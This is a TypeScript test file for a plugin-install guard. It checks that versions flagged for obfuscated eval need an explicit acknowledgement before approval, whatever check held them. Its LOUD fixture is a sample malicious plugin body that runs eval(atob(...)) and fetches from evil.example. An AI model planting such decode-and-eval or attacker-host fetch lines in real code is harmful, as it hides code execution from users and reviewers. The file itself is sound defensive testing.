// What may lift a held version is decided by the guard's own facts (a hard flag its `evaluate` found, a version it did not read, a hash mismatch), not by the words of a note.
// The hole: a version from an unknown source with `eval(atob(...))` was held for "неизвестный источник" (the check that stopped first), the hard flag was never written,
// and `approve` without `acknowledgeBlock` was then a routine action a SESSION covers.
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { liftBlock } from "../../guard/src/trust.ts";
import { coreHash, startGuard, type TestGuard } from "./support.ts";

const cleanup: Array<() => void | Promise<void>> = [];
afterEach(async () => {
  for (const f of cleanup.splice(0).reverse()) await f();
});
const tmp = (p: string): string => {
  const d = realpathSync(mkdtempSync(join(tmpdir(), p)));
  cleanup.push(() => rmSync(d, { recursive: true, force: true }));
  return d;
};
const QUIET = `export default function plugin(bb) {\n  bb.log.info("hello");\n}\n`;
const LOUD = `export default function plugin(bb) {\n  eval(atob("YWxlcnQoMSk="));\n  fetch("https://evil.example/x");\n}\n`;
function write(dir: string, name: string, server: string): string {
  const d = join(dir, name);
  mkdirSync(d, { recursive: true });
  writeFileSync(join(d, "package.json"), JSON.stringify({ name, version: "1.0.0", bb: { name, server: "./server.ts" } }));
  writeFileSync(join(d, "server.ts"), server);
  return d;
}
const req = (op: string, rootDir: string, pluginId: string, over: Record<string, unknown> = {}) => ({ op, pluginId, version: "1.0.0", contentHash: coreHash(rootDir), rootDir, source: `path:${rootDir}`, sourceKind: "path", provenance: "direct", trigger: "install", ...over });
const entryOf = async (g: TestGuard, id: number): Promise<any> => ((await g.send({ op: "state" })).queue as any[]).find((q) => q.id === id);
const code = (res: Record<string, any>): string | undefined => res.error?.code;

async function setup(body = LOUD) {
  const plugins = tmp("sbb-bf-");
  const g: TestGuard = await startGuard({ trust: {} });
  cleanup.push(() => g.close());
  const dir = write(plugins, "evil", body);
  // an unknown source: the first check that stops it is «неизвестный источник», long before the hard flags are looked at
  const held = await g.send(req("decide", dir, "evil"));
  expect(held.action).toBe("wait");
  return { g, plugins, dir, id: held.requestId as number };
}

describe("the guard records what it read, whatever check stopped the hold", () => {
  it("unknown source + eval(atob) + fetch: the note says «неизвестный источник», the facts say block", async () => {
    const { g, id } = await setup();
    const q = await entryOf(g, id);
    expect(q.note).toBe("неизвестный источник");
    expect(q.reasonKind).toBe("block");
    expect(q.blocks.length).toBeGreaterThan(0);
  });
  it("a clean version: blocks read and empty, kind by the check that stopped it", async () => {
    const { g, id } = await setup(QUIET);
    const q = await entryOf(g, id);
    expect(q.blocks).toEqual([]);
    expect(q.reasonKind).toBe("unknown-source");
  });
  it("strict mode: the kind is strict, the block is still written", async () => {
    const plugins = tmp("sbb-bf-");
    const g: TestGuard = await startGuard({ trust: {} });
    cleanup.push(() => g.close());
    await g.send({ op: "trust-mode", mode: "strict" });
    const dir = write(plugins, "evil", LOUD);
    const r = await g.send(req("decide", dir, "evil"));
    expect(r.action).toBe("wait");
    const q = await entryOf(g, r.requestId);
    expect(q.note).toMatch(/Строгий/);
    expect(q.blocks.length).toBeGreaterThan(0);
  });
});

describe("approve, batch, «Вернуть», «доверять источнику» — by the facts", () => {
  it("approve without acknowledgeBlock is refused, with a session too; a fresh code with acknowledgeBlock passes", async () => {
    const { g, id } = await setup();
    expect(code(await g.send({ op: "approve", requestId: id, code: g.nextCode() }))).toBe("invalid");
    const sess = await g.send({ op: "session-open", code: g.nextCode() });
    expect(sess.ok).toBe(true);
    expect(code(await g.send({ op: "approve", requestId: id, session: sess.token }))).toBe("invalid");
    // a session cannot carry the acknowledgement either
    expect(code(await g.send({ op: "approve", requestId: id, acknowledgeBlock: true, session: sess.token }))).toBe("invalid_code");
    expect((await entryOf(g, id)).status).toBe("held");
    const ok = await g.send({ op: "approve", requestId: id, acknowledgeBlock: true, code: g.nextCode() });
    expect(ok.ok).toBe(true);
    expect((await entryOf(g, id)).status).toBe("approved");
  });

  it("a clean version is still a routine approval a session covers", async () => {
    const { g, id } = await setup(QUIET);
    const sess = await g.send({ op: "session-open", code: g.nextCode() });
    expect((await g.send({ op: "approve", requestId: id, session: sess.token })).ok).toBe(true);
  });

  it("batch: the version with a hard flag is skipped at prepare and refused at approve", async () => {
    const { g, plugins, id } = await setup();
    const clean = write(plugins, "fine", QUIET);
    const c = await g.send(req("decide", clean, "fine"));
    const prep = await g.send({ op: "batch-prepare", items: [{ kind: "queue", id }, { kind: "queue", id: c.requestId }] });
    expect(prep.ok).toBe(true);
    expect(prep.skipped.map((s: any) => s.id)).toEqual([id]);
    expect(prep.items.map((i: any) => i.id)).toEqual([c.requestId]);
    const only = await g.send({ op: "batch-prepare", items: [{ kind: "queue", id }] });
    expect(code(only)).toBe("invalid");
  });

  it("«Вернуть» (dismissed, then back) and «доверять источнику» do not lift it either", async () => {
    const { g, id } = await setup();
    expect((await g.send({ op: "dismiss", requestId: id })).ok).toBe(true);
    expect(code(await g.send({ op: "approve", requestId: id, code: g.nextCode() }))).toBe("invalid");
    const sess = await g.send({ op: "session-open", code: g.nextCode() });
    expect(code(await g.send({ op: "approve", requestId: id, session: sess.token }))).toBe("invalid");
    expect(code(await g.send({ op: "approve-trust", requestId: id, code: g.nextCode() }))).toBe("invalid");
    expect((await g.send({ op: "state" })).approvals).toHaveLength(0);
  });

  it("strict mode: neither with nor without acknowledgeBlock", async () => {
    const { g, id } = await setup();
    expect((await g.send({ op: "trust-mode", mode: "strict" })).ok).toBe(true);
    expect(code(await g.send({ op: "approve", requestId: id, code: g.nextCode() }))).toBe("invalid");
    expect(code(await g.send({ op: "approve", requestId: id, acknowledgeBlock: true, code: g.nextCode() }))).toBe("invalid");
    expect((await g.send({ op: "state" })).approvals).toHaveLength(0);
  });
});

describe("what the hook says is not believed", () => {
  it("the hook holds with stop and no note: the guard reads the version itself and knows the block", async () => {
    const plugins = tmp("sbb-bf-");
    const g: TestGuard = await startGuard({ trust: {} });
    cleanup.push(() => g.close());
    const dir = write(plugins, "evil", LOUD);
    const held = await g.send(req("hold", dir, "evil", { stop: true }));
    expect(held.ok).toBe(true);
    const q = await entryOf(g, held.requestId);
    expect(q.note ?? null).toBeNull();
    expect(q.blocks.length).toBeGreaterThan(0);
    expect(code(await g.send({ op: "approve", requestId: held.requestId, code: g.nextCode() }))).toBe("invalid");
  });

  it("the hook claims nothing wrong about a clean version: stop is kept, the facts say clean", async () => {
    const plugins = tmp("sbb-bf-");
    const g: TestGuard = await startGuard({ trust: {} });
    cleanup.push(() => g.close());
    const dir = write(plugins, "fine", QUIET);
    const held = await g.send(req("hold", dir, "fine", { stop: true, blocks: ["decode-eval"], findings: ["decode-eval"] }));
    const q = await entryOf(g, held.requestId);
    expect(q.blocks).toEqual([]);
    expect(q.reasonKind).toBe("other");
  });

  it("a version the guard could not read (hold by the hook) counts as one that may carry a block", async () => {
    const plugins = tmp("sbb-bf-");
    const g: TestGuard = await startGuard({ trust: {} });
    cleanup.push(() => g.close());
    const dir = write(plugins, "gone", QUIET);
    const held = await g.send(req("hold", dir, "gone", { stop: true, contentHash: "sha256:" + "1".repeat(64) }));
    const q = await entryOf(g, held.requestId);
    expect(q.blocks).toBeNull();
    expect(q.reasonKind).toBe("mismatch");
    expect(code(await g.send({ op: "approve", requestId: held.requestId, acknowledgeBlock: true, code: g.nextCode() }))).toBe("invalid");
  });
});

describe("an entry older than the columns", () => {
  it("has no facts: it may carry a block (fresh touch and acknowledgeBlock), and a mismatch note is still read as a mismatch", async () => {
    const { g, plugins } = await setup(QUIET);
    const db = (g.guard as any).db;
    const add = (note: string, hash: string) =>
      Number(db.prepare(`INSERT INTO queue (content_hash, plugin_id, version, source, source_kind, root_dir, trigger, status, first_seen, last_seen, note) VALUES (?, 'old', '1.0.0', 'path:/x', 'path', '/x', 'install', 'held', 1, 1, ?)`).run(hash, note).lastInsertRowid);
    const old = add("неизвестный источник", "sha256:" + "a".repeat(64));
    const q = await entryOf(g, old);
    expect(q.blocks).toBeNull();
    expect(q.reasonKind).toBeNull();
    const sess = await g.send({ op: "session-open", code: g.nextCode() });
    expect(code(await g.send({ op: "approve", requestId: old, session: sess.token }))).toBe("invalid");
    expect(code(await g.send({ op: "approve", requestId: old, code: g.nextCode() }))).toBe("invalid");
    expect((await g.send({ op: "approve", requestId: old, acknowledgeBlock: true, code: g.nextCode() })).ok).toBe(true);
    const mis = add("хеш каталога не совпал с хешем из запроса", "sha256:" + "b".repeat(64));
    expect(code(await g.send({ op: "approve", requestId: mis, acknowledgeBlock: true, code: g.nextCode() }))).toBe("invalid");
    void plugins;
  });
});

describe("liftBlock: one rule for the guard and the page", () => {
  it("reads facts only", () => {
    expect(liftBlock({ reasonKind: "mismatch", blocks: [] }, "simple")).toMatchObject({ never: true });
    expect(liftBlock({ reasonKind: "unknown-source", blocks: ["decode-eval a.js:1"] }, "simple")).toMatchObject({ never: false, needsAck: true, why: "block", refusedByMode: false });
    expect(liftBlock({ reasonKind: "block", blocks: [] }, "simple")).toMatchObject({ needsAck: true, why: "block" });
    expect(liftBlock({ reasonKind: "unknown-source", blocks: [] }, "simple")).toMatchObject({ never: false, needsAck: false, why: null });
    expect(liftBlock({ reasonKind: "other", blocks: null }, "simple")).toMatchObject({ needsAck: true, why: "unread" });
    expect(liftBlock({}, "detailed")).toMatchObject({ needsAck: true, why: "unread" });
    expect(liftBlock({ reasonKind: "other", blocks: ["x"] }, "strict")).toMatchObject({ needsAck: true, refusedByMode: true });
    expect(liftBlock({ reasonKind: "other", blocks: [] }, "strict")).toMatchObject({ needsAck: false, refusedByMode: false });
  });
});
